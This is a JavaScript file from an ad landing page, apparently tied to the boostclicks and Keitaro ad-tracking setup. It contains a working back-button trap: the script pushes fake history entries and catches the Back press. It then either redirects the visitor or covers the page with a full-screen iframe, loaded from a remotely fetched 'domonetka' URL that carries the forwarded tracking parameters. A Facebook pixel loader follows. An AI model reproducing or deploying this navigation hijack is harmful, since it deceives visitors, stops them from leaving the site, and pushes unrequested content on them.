(function () {
  'use strict';

  // =========================
  // DOMONETKA (merged logic)
  // =========================

  function safeTrim(v) {
    if (v === undefined || v === null) return '';
    return String(v).trim();
  }

  function getCookie(name) {
    try {
      var matches = document.cookie.match(
        new RegExp('(?:^|; )' + name.replace(/([$?*|{}()[\]\\/+^])/g, '\\$1') + '=([^;]*)')
      );
      return matches ? decodeURIComponent(matches[1]) : null;
    } catch (e) {
      return null;
    }
  }

  function getQueryParam(name) {
    try {
      var params = new URLSearchParams(window.location.search);
      return params.get(name) || '';
    } catch (e) {
      var m = window.location.search.match(new RegExp('[?&]' + name + '=([^&]+)'));
      return m ? decodeURIComponent(m[1]) : '';
    }
  }

  function getDomonetkaFromGlobal() {
    try {
      if (typeof window.domonetka !== 'undefined') {
        var v = safeTrim(window.domonetka);
        if (v && v !== '{domonetka}' && /^https?:\/\//i.test(v)) return v;
      }
    } catch (e) {}
    return '';
  }

  function getDomonetkaFromStorage() {
    try {
      var s = safeTrim(sessionStorage.getItem('domonetkaBC'));
      if (s && /^https?:\/\//i.test(s)) return s;
    } catch (e) {}
    var c = safeTrim(getCookie('domonetkaBC'));
    if (c && /^https?:\/\//i.test(c)) return c;
    return '';
  }

  function setDomonetkaSourceStorage(src) {
    src = safeTrim(src);
    if (!src) return;
    try { sessionStorage.setItem('domonetkaSourceBC', src); } catch (e) {}
    try { document.cookie = 'domonetkaSourceBC=' + encodeURIComponent(src) + '; path=/; max-age=7200'; } catch (e) {}
  }

  function getDomonetkaSourceFromStorage() {
    try {
      var s = safeTrim(sessionStorage.getItem('domonetkaSourceBC'));
      if (s) return s;
    } catch (e) {}
    var c = safeTrim(getCookie('domonetkaSourceBC'));
    return c || '';
  }

  function setDomonetkaStorage(url, source) {
    url = safeTrim(url);
    if (!url) return;
    try { sessionStorage.setItem('domonetkaBC', url); } catch (e) {}
    try { document.cookie = 'domonetkaBC=' + encodeURIComponent(url) + '; path=/; max-age=7200'; } catch (e) {}
    if (source) setDomonetkaSourceStorage(source);
  }

  // Snapshot landing query string once per tab (sessionStorage) so we can forward
  // full tag set to domonetka even after in-site navigation or URL mutations.
  var LANDING_QS_KEY = 'bc_lp_qs';

  function readSearchNoQuestion() {
    try { return String(window.location.search || '').replace(/^\?/, ''); }
    catch (e) { return ''; }
  }

  function refreshLandingSnapshot() {
    var now = readSearchNoQuestion();
    if (!now) return;
    try {
      var prev = String(sessionStorage.getItem(LANDING_QS_KEY) || '');
      if (!prev || now.length > prev.length) {
        sessionStorage.setItem(LANDING_QS_KEY, now);
      }
    } catch (e) {}
  }

  function getLandingParams() {
    var raw = '';
    try { raw = String(sessionStorage.getItem(LANDING_QS_KEY) || ''); } catch (e) { raw = ''; }
    if (!raw) {
      raw = readSearchNoQuestion();
      try { if (raw) sessionStorage.setItem(LANDING_QS_KEY, raw); } catch (e) {}
    }
    try {
      return new URLSearchParams(raw);
    } catch (e) {
      return new URLSearchParams();
    }
  }

  function buildDomonetkaUrlWithMappedParams(domUrl) {
    var srcParams = getLandingParams();

    var u = new URL(domUrl, window.location.href);
    var out = new URLSearchParams(u.search);

    // Pass-through everything except internal keys (starts with "_") + banned keys
    srcParams.forEach(function (value, key) {
      if (!key) return;
      var k = String(key);
      if (k[0] === '_') return;

      // запрещаем ad_id, ad, sub_id_11 (как у тебя в большом коде)
      if (k === 'ad_id') return;
      if (k === 'ad' || k === 'sub_id_11') return;

      if (!out.has(k)) out.set(k, value);
    });

    // Если domUrl уже содержит ad_id/ad/sub_id_11 — чистим
    out.delete('ad_id');
    out.delete('ad');
    out.delete('sub_id_11');

    // Ensure keitaro aliases are always present (both directions).
    var pairs = [
      ['acc', 'sub_id_2'],
      ['placement', 'sub_id_3'],
      ['buyer', 'sub_id_4'],
      ['adset', 'sub_id_5'],
    ];
    pairs.forEach(function (p) {
      var a = p[0];
      var b = p[1];
      if (srcParams.has(a) && !out.has(b)) out.set(b, srcParams.get(a));
      if (srcParams.has(b) && !out.has(a)) out.set(a, srcParams.get(b));
    });

    u.search = out.toString() ? ('?' + out.toString()) : '';
    return u.toString();
  }

  function showDomonetkaFrame(finalUrl) {
    finalUrl = safeTrim(finalUrl);
    if (!finalUrl) return;

    if (window.__boostclicksDomonetkaFrameShown === 1) return;
    window.__boostclicksDomonetkaFrameShown = 1;

    try {
      var wrap = document.getElementById('boostclicks-domonetka-frame-wrap');
      if (!wrap) {
        wrap = document.createElement('div');
        wrap.id = 'boostclicks-domonetka-frame-wrap';
        wrap.style.position = 'fixed';
        wrap.style.left = '0';
        wrap.style.top = '0';
        wrap.style.width = '100%';
        wrap.style.height = '100%';
        wrap.style.zIndex = '2147483647';
        wrap.style.background = '#fff';
        wrap.style.pointerEvents = 'auto';

        var iframe = document.createElement('iframe');
        iframe.id = 'boostclicks-domonetka-frame';
        iframe.style.border = '0';
        iframe.style.width = '100%';
        iframe.style.height = '100%';
        iframe.setAttribute('referrerpolicy', 'no-referrer-when-downgrade');
        iframe.setAttribute('loading', 'eager');

        wrap.appendChild(iframe);
        document.body.appendChild(wrap);
      }

      var ifr = document.getElementById('boostclicks-domonetka-frame');
      if (ifr) ifr.src = finalUrl;

      try { document.documentElement.style.overflow = 'hidden'; } catch (e) {}
      try { document.body.style.overflow = 'hidden'; } catch (e) {}
    } catch (e) {}
  }

  // mode: 'redirect' | 'frame'
  function initDomonetka(domUrl, mode) {
    domUrl = safeTrim(domUrl);
    mode = safeTrim(mode) || 'redirect';
    if (!domUrl) return;

    if (window.__boostclicksDomonetkaInit === 1) return;
    window.__boostclicksDomonetkaInit = 1;

    // keep for other scripts / thank-you page
    try { sessionStorage.setItem('dom', domUrl); } catch (e) {}

    // more reliable: double trap
    try {
      history.pushState({ domonetkaTrap: 1 }, document.title, location.href);
      history.pushState({ domonetkaTrap: 2 }, document.title, location.href);
    } catch (e) {}

    // popstate handler
    window.addEventListener('popstate', function (event) {
      if (!event) return;

      // guard: fire once
      if (window.__boostclicksDomonetkaFired === 1) return;
      window.__boostclicksDomonetkaFired = 1;

      var finalUrl = domUrl;
      try { finalUrl = buildDomonetkaUrlWithMappedParams(domUrl); } catch (e) {}

      if (mode === 'frame') {
        showDomonetkaFrame(finalUrl);
        return;
      }

      try { window.location.replace(finalUrl); }
      catch (e) { window.location.href = finalUrl; }
    });
  }

  function fetchDomonetkaForDomain(domain) {
    domain = safeTrim(domain);
    if (!domain) return;

    if (window.__boostclicksDomonetkaFetch === 1) return;
    window.__boostclicksDomonetkaFetch = 1;

    var url = 'https://analytics.boostclicks.ru/api/domonetka.php?domain=' + encodeURIComponent(domain);

    function onUrl(u) {
      u = safeTrim(u);
      if (!u) return;
      setDomonetkaStorage(u, 'api');
      initDomonetka(u, 'frame');
    }

    try {
      if (window.fetch) {
        var ctrl = null;
        var timeoutId = null;
        try {
          ctrl = new AbortController();
          timeoutId = setTimeout(function () { try { ctrl.abort(); } catch (e) {} }, 1500);
        } catch (e) { ctrl = null; }

        fetch(url, { method: 'GET', mode: 'cors', signal: ctrl ? ctrl.signal : undefined })
          .then(function (r) { return r && r.ok ? r.json() : null; })
          .then(function (data) {
            if (timeoutId) clearTimeout(timeoutId);
            if (data && data.url) onUrl(data.url);
          })
          .catch(function () { if (timeoutId) clearTimeout(timeoutId); });

        return;
      }
    } catch (e) {}

    // XHR fallback
    try {
      var xhr = new XMLHttpRequest();
      xhr.open('GET', url, true);
      xhr.timeout = 1500;
      xhr.onreadystatechange = function () {
        if (xhr.readyState !== 4) return;
        if (xhr.status !== 200) return;
        try {
          var data = JSON.parse(xhr.responseText || '{}');
          if (data && data.url) onUrl(data.url);
        } catch (e) {}
      };
      xhr.send(null);
    } catch (e) {}
  }

  function hasValidKeitaroClick() {
    try {
      var s = safeTrim(getCookie('_subid'));
      return !!(s && s !== '{subid}');
    } catch (e) {}
    return false;
  }

  function getParamFromLandingOrUrlOrCookie(key) {
    key = String(key || '').trim();
    if (!key) return '';

    // 1) landing snapshot
    try {
      var lp = getLandingParams();
      var v1 = safeTrim(lp.get(key));
      if (v1) return v1;
    } catch (e) {}

    // 2) current URL
    try {
      var v2 = safeTrim(getQueryParam(key));
      if (v2) return v2;
    } catch (e) {}

    // 3) cookie fallback
    try {
      var v3 = safeTrim(getCookie(key));
      if (v3) return v3;
    } catch (e) {}

    return '';
  }

  // Capture/refresh landing tags early
  refreshLandingSnapshot();
  setTimeout(refreshLandingSnapshot, 1500);
  setTimeout(refreshLandingSnapshot, 3500);

  // Decide domonetka URL source
  var domFromGlobal = getDomonetkaFromGlobal();
  var domFromStorage = domFromGlobal ? '' : getDomonetkaFromStorage();
  var domonetkaUrlNow = domFromGlobal || domFromStorage;

  // Force iframe mode when Keitaro click + gclid present
  var gclidVal = getParamFromLandingOrUrlOrCookie('gclid');
  var forceFrameBecauseGclid = hasValidKeitaroClick() && !!gclidVal;

  if (domonetkaUrlNow) {
    if (domFromGlobal) {
      setDomonetkaStorage(domonetkaUrlNow, 'global');
      initDomonetka(domonetkaUrlNow, forceFrameBecauseGclid ? 'frame' : 'redirect');
    } else {
      var src = getDomonetkaSourceFromStorage() || 'api';
      var baseMode = (src === 'global') ? 'redirect' : 'frame';
      initDomonetka(domonetkaUrlNow, forceFrameBecauseGclid ? 'frame' : baseMode);
    }
  } else {
    // auto-fetch only on main domains
    try {
      var hn = (window.location.hostname || '').replace(/^www\./i, '');
      if (hn && hn.split('.').length === 2) {
        fetchDomonetkaForDomain(hn);
      }
    } catch (e) {}
  }

  // =========================
  // FB Pixel (your original)
  // =========================

  var pixelId = (getQueryParam('fb_dynamic_pixel') || getQueryParam('pxl') || '').trim();
  if (!pixelId) return;

  try { sessionStorage.setItem('pxl', pixelId); } catch (e) {}
  try { localStorage.setItem('pxl', pixelId); } catch (e) {}

  !function (f, b, e, v, n, t, s) {
    if (f.fbq) return;
    n = f.fbq = function () {
      n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments);
    };
    if (!f._fbq) f._fbq = n;
    n.push = n;
    n.loaded = true;
    n.version = '2.0';
    n.queue = [];
    t = b.createElement(e); t.async = true;
    t.src = v;
    s = b.getElementsByTagName(e)[0];
    s.parentNode.insertBefore(t, s);
  }(window, document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');

  try {
    fbq('init', pixelId);
    fbq('track', 'PageView');
  } catch (e) {}
})();
